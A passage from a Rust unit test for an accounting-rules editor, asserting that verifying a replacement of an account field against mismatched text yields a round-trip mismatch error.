        let doc = parsed("account2  expenses:unknown\n");
        let plan = replace_plan(
            &doc,
            0,
            ItemBody::Assignment {
                field: account(2),
                value: "expenses:food".to_string(),
            },
        );
        assert_eq!(
            doc.verify(&plan, "account2  expenses:travel\n"),
            Err(RulesError::RoundTripMismatch)
        );
    }
}
